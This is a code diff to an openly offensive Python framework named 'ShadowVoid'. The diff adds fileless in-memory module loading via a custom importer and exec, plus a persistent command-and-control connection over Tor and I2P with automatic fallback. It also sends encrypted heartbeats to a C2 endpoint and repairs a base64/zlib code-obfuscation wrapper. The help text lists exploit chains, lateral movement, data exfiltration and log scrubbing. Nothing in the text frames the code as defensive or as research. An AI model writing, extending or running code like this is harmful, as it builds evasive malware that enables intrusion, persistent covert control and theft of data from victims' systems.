@@ -25,7 +25,10 @@ import ctypes
 import inspect
 import shutil
 import importlib.util
+import mmap
+import marshal
 from datetime import datetime, timedelta
+from types import ModuleType
 
 
 # Framework Configuration
@@ -114,17 +117,93 @@ SESSION = {
 # Module registry
 MODULES = {}
 
+# Memory-resident module cache
+MODULE_SOURCE_CACHE = {}
+
+
+def load_module_from_memory(name, source_code):
+    """Load a module from memory without touching disk"""
+    try:
+        module = ModuleType(name)
+        sys.modules[name] = module
+        exec(compile(source_code, '<memory>', 'exec'), module.__dict__)
+        return module
+    except Exception as e:
+        return None
+
+
+def make_memory_resident():
+    """Install custom module loader to serve modules from memory cache"""
+    try:
+        class MemoryModuleLoader:
+            def find_module(self, name, path=None):
+                if name in MODULE_SOURCE_CACHE:
+                    return self
+                return None
+
+            def load_module(self, name):
+                source = MODULE_SOURCE_CACHE.get(name)
+                if source:
+                    module = ModuleType(name)
+                    sys.modules[name] = module
+                    exec(compile(source, '<memory>', 'exec'), module.__dict__)
+                    return module
+                raise ImportError(f"Module {name} not in memory cache")
+
+        memory_loader = MemoryModuleLoader()
+        if memory_loader not in sys.meta_path:
+            sys.meta_path.insert(0, memory_loader)
+        return True
+    except Exception as e:
+        return False
+
+
+def execute_in_memory(code_string, globals_dict=None):
+    """Execute Python code directly from memory"""
+    try:
+        if globals_dict is None:
+            globals_dict = {}
+        exec(compile(code_string, '<memory>', 'exec'), globals_dict)
+        return True
+    except Exception as e:
+        return False
+
+
+def cache_module_in_memory(module_name, module_path):
+    """Cache a module's source code in memory for disk-less loading"""
+    try:
+        if os.path.exists(module_path):
+            with open(module_path, 'r') as f:
+                source = f.read()
+            MODULE_SOURCE_CACHE[module_name] = source
+            return True
+        return False
+    except Exception as e:
+        return False
+
 
 def load_modules():
     """Dynamically load all enabled modules"""
     for name, config in CONFIG['modules'].items():
         if config['enabled']:
             try:
-                module_path = config['path']
-                spec = importlib.util.spec_from_file_location(name, module_path + '.py')
-                module = importlib.util.module_from_spec(spec)
-                spec.loader.exec_module(module)
-                MODULES[name] = module
+                module_path = config['path'] + '.py'
+                full_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), module_path)
+                # Cache source in memory
+                cache_module_in_memory(name, full_path)
+                # Load from memory
+                source = MODULE_SOURCE_CACHE.get(name)
+                if source:
+                    module = load_module_from_memory(name, source)
+                    if module:
+                        MODULES[name] = module
+                else:
+                    # Fallback to file-based loading
+                    if os.path.exists(full_path):
+                        spec = importlib.util.spec_from_file_location(name, full_path)
+                        module = importlib.util.module_from_spec(spec)
+                        spec.loader.exec_module(module)
+                        MODULES[name] = module
             except Exception as e:
                 print('Failed to load module ' + name + ': ' + str(e))
 
@@ -308,6 +387,131 @@ class DomainGenerator:
         return domains
 
 
+# C2 Connection Manager
+class C2Connection:
+    """Persistent C2 connection with automatic Tor/I2P fallback"""
+    
+    def __init__(self, core):
+        self.core = core
+        self.tor_router = None
+        self.i2p_router = None
+        self.connected = False
+        self.connection_thread = None
+        self.running = False
+        self.current_router = None
+        self.routers = []
+
+    def initialize_routers(self):
+        """Initialize Tor and I2P routers"""
+        try:
+            if CONFIG['c2']['routing']['tor']:
+                socks_port = CONFIG['c2']['routing']['socks5'].split(':')[1]
+                self.tor_router = TorRouter(socks_port=socks_port)
+                if self.tor_router.is_available():
+                    self.routers.append(('tor', self.tor_router))
+            if CONFIG['c2']['routing']['i2p']:
+                self.i2p_router = I2PRouter()
+                if self.i2p_router.is_available():
+                    self.routers.append(('i2p', self.i2p_router))
+            return True
+        except Exception as e:
+            return False
+
+    def connect(self):
+        """Connect using best available router"""
+        try:
+            if not self.routers:
+                self.initialize_routers()
+            for router_type, router in self.routers:
+                try:
+                    test_url = 'https://check.torproject.org' if router_type == 'tor' else 'http://i2p-projekt.i2p'
+                    response = router.make_request(test_url, timeout=10)
+                    if response and response.status_code < 400:
+                        self.current_router = router
+                        self.connected = True
+                        return True
+                except:
+                    continue
+            self.connected = False
+            return False
+        except Exception as e:
+            self.connected = False
+            return False
+
+    def make_request(self, url, method='GET', data=None, headers=None, encrypt=True):
+        """Make a request through C2 connection with automatic fallback"""
+        try:
+            if not self.connected:
+                if not self.connect():
+                    return None
+            
+            if headers is None:
+                headers = {'User-Agent': 'Mozilla/5.0'}
+            
+            # Encrypt data if requested
+            if encrypt and data and self.core.cipher:
+                if isinstance(data, str):
+                    data = data.encode('utf-8')
+                encrypted_data = self.core.cipher.encrypt(data)
+                headers['X-Encrypted'] = 'AES256-GCM'
+            else:
+                encrypted_data = data
+            
+            # Try with current router first
+            if self.current_router:
+                try:
+                    response = self.current_router.make_request(url, method, encrypted_data, headers, timeout=30)
+                    if response and response.status_code < 400:
+                        return response
+                except:
+                    pass
+            
+            # Fallback to other routers
+            for router_type, router in self.routers:
+                if router == self.current_router:
+                    continue
+                try:
+                    response = router.make_request(url, method, encrypted_data, headers, timeout=30)
+                    if response and response.status_code < 400:
+                        self.current_router = router
+                        return response
+                except:
+                    continue
+            
+            return None
+        except Exception as e:
+            return None
+
+    def start_persistent_connection(self):
+        """Start persistent connection with automatic reconnection"""
+        if self.running:
+            return True
+        self.running = True
+        self.connection_thread = threading.Thread(target=self._persistent_loop, daemon=True)
+        self.connection_thread.start()
+        return True
+
+    def _persistent_loop(self):
+        """Persistent connection loop"""
+        while self.running:
+            try:
+                if not self.connected:
+                    self.connect()
+                if self.connected and self.core.heartbeat:
+                    self.core.heartbeat.send_heartbeat()
+                time.sleep(60)
+            except Exception as e:
+                time.sleep(30)
+
+    def stop(self):
+        """Stop persistent connection"""
+        self.running = False
+        if self.connection_thread:
+            self.connection_thread.join(timeout=5)
+        self.connected = False
+        self.current_router = None
+
+
 # C2 Routing
 class TorRouter:
     def __init__(self, socks_port='9050', control_port='9051'):
@@ -324,13 +528,13 @@ class TorRouter:
         except:
             return False
 
-    def make_request(self, url, method='GET', data=None, headers=None):
+    def make_request(self, url, method='GET', data=None, headers=None, timeout=30):
         try:
             import requests
             proxies = {'http': self.proxy_url, 'https': self.proxy_url}
             if headers is None:
                 headers = {'User-Agent': 'Mozilla/5.0'}
-            response = requests.request(method, url, proxies=proxies, data=data, headers=headers, timeout=30)
+            response = requests.request(method, url, proxies=proxies, data=data, headers=headers, timeout=timeout)
             return response
         except:
             return None
@@ -350,7 +554,7 @@ class I2PRouter:
         except:
             return False
 
-    def make_request(self, url, method='GET', data=None, headers=None):
+    def make_request(self, url, method='GET', data=None, headers=None, timeout=30):
         try:
             import requests
             proxies = {'http': self.proxy_url, 'https': self.proxy_url}
@@ -359,7 +563,7 @@ class I2PRouter:
             if not url.endswith('.i2p'):
                 if url.endswith('.onion'):
                     url = url.replace('.onion', '.b32.i2p')
-            response = requests.request(method, url, proxies=proxies, data=data, headers=headers, timeout=30)
+            response = requests.request(method, url, proxies=proxies, data=data, headers=headers, timeout=timeout)
             return response
         except:
             return None
@@ -401,13 +605,14 @@ class DeadDropResolver:
 
 # Heartbeat Manager
 class HeartbeatManager:
-    def __init__(self, interval=300, jitter=60, kill_switch=7200):
+    def __init__(self, interval=300, jitter=60, kill_switch=7200, c2_connection=None):
         self.interval = interval
         self.jitter = jitter
         self.kill_switch = kill_switch
         self.running = False
         self.last_heartbeat = datetime.now()
         self.cipher = AES256GCM(generate_key())
+        self.c2_connection = c2_connection
 
     def run(self):
         self.running = True
@@ -435,6 +640,14 @@ class HeartbeatManager:
                 'compromised': len(SESSION.get('compromised', []))
             }
             encrypted = self.cipher.encrypt(json.dumps(heartbeat_data).encode())
+            # Send through C2 if available
+            if self.c2_connection and self.c2_connection.connected:
+                self.c2_connection.make_request(
+                    CONFIG['c2'].get('heartbeat_url', 'https://c2.example.com/heartbeat'),
+                    'POST',
+                    encrypted,
+                    {'Content-Type': 'application/octet-stream'}
+                )
         except:
             pass
 
@@ -526,8 +739,7 @@ def code_obfuscation(code):
     try:
         compressed = zlib.compress(code.encode())
         encoded = base64.b64encode(compressed).decode()
-        return "import base64,zlib
-exec(zlib.decompress(base64.b64decode('" + encoded + ")))"
+        return "import base64,zlib\nexec(zlib.decompress(base64.b64decode('" + encoded + "')))"
     except:
         return code
 
@@ -543,11 +755,13 @@ class ShadowVoidCore:
         self.dead_drops = None
         self.heartbeat = None
         self.cipher = None
+        self.c2_connection = None
         self.initialize()
 
     def initialize(self):
         self.initialize_stealth()
         self.initialize_crypto()
+        self.initialize_memory_resident()
         load_modules()
         if CONFIG['c2']['enabled']:
             self.initialize_c2()
@@ -579,6 +793,20 @@ class ShadowVoidCore:
         except:
             pass
 
+    def initialize_memory_resident(self):
+        """Initialize memory-resident execution capability"""
+        try:
+            make_memory_resident()
+            # Cache core modules in memory
+            modules_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'modules')
+            for name, config in CONFIG['modules'].items():
+                if config['enabled']:
+                    module_path = os.path.join(modules_dir, name + '.py')
+                    cache_module_in_memory(name, module_path)
+            return True
+        except Exception as e:
+            return False
+
     def initialize_c2(self):
         try:
             if CONFIG['c2']['routing']['tor']:
@@ -591,11 +819,17 @@ class ShadowVoidCore:
                     tlds=CONFIG['c2']['dga']['tlds']
                 )
             self.dead_drops = DeadDropResolver()
+            # Initialize C2 connection manager
+            self.c2_connection = C2Connection(self)
+            self.c2_connection.initialize_routers()
+            self.c2_connection.start_persistent_connection()
+            # Update heartbeat with C2 connection
             if CONFIG['c2'].get('heartbeat'):
                 self.heartbeat = HeartbeatManager(
                     interval=CONFIG['c2']['heartbeat']['interval'],
                     jitter=CONFIG['c2']['heartbeat']['jitter'],
-                    kill_switch=CONFIG['c2']['heartbeat']['kill_switch']
+                    kill_switch=CONFIG['c2']['heartbeat']['kill_switch'],
+                    c2_connection=self.c2_connection
                 )
                 heartbeat_thread = threading.Thread(target=self.heartbeat.run, daemon=True)
                 heartbeat_thread.start()
@@ -614,6 +848,8 @@ class ShadowVoidCore:
         SESSION['active'] = False
         if self.heartbeat:
             self.heartbeat.stop()
+        if self.c2_connection:
+            self.c2_connection.stop()
         scrub_history()
         log_tampering()
         SESSION['kill_switch_triggered'] = False
@@ -725,7 +961,8 @@ class ShadowVoidCore:
                 'tor': self.tor_router is not None and self.tor_router.is_available(),
                 'i2p': self.i2p_router is not None and self.i2p_router.is_available(),
                 'dga': self.dga is not None,
-                'heartbeat': self.heartbeat is not None
+                'heartbeat': self.heartbeat is not None,
+                'persistent_connection': self.c2_connection is not None and self.c2_connection.connected
             }
             return {'status': 'success', 'c2_status': status}
         elif subcmd == 'generate':
@@ -736,20 +973,7 @@ class ShadowVoidCore:
         return {'status': 'error', 'message': 'Invalid C2 command'}
 
     def cmd_help(self, args):
-        help_text = "ShadowVoid Framework - Memory-Resident Offensive Security Orchestrator
-
-COMMANDS:
-  init                    Initialize stealth environment
-  scan <target> [type]   Run reconnaissance
-  exploit <cve> [target] Execute exploit chain
-  pivot <target> [method] Establish lateral movement
-  exfil <source> <dest> [channel] Start data exfiltration
-  clean                  Scrub logs and artifacts
-  modules list           List loaded modules
-  c2 status              Show C2 status
-  c2 generate [count]    Generate DGA domains
-  help                   Show this help
-  exit                   End session and exit"
+        help_text = "ShadowVoid Framework - Memory-Resident Offensive Security Orchestrator\n\nCOMMANDS:\n  init                    Initialize stealth environment\n  scan <target> [type]   Run reconnaissance\n  exploit <cve> [target] Execute exploit chain\n  pivot <target> [method] Establish lateral movement\n  exfil <source> <dest> [channel] Start data exfiltration\n  clean                  Scrub logs and artifacts\n  modules list           List loaded modules\n  c2 status              Show C2 status\n  c2 generate [count]    Generate DGA domains\n  help                   Show this help\n  exit                   End session and exit"
         return {'status': 'success', 'help': help_text}
 
     def cmd_exit(self, args):
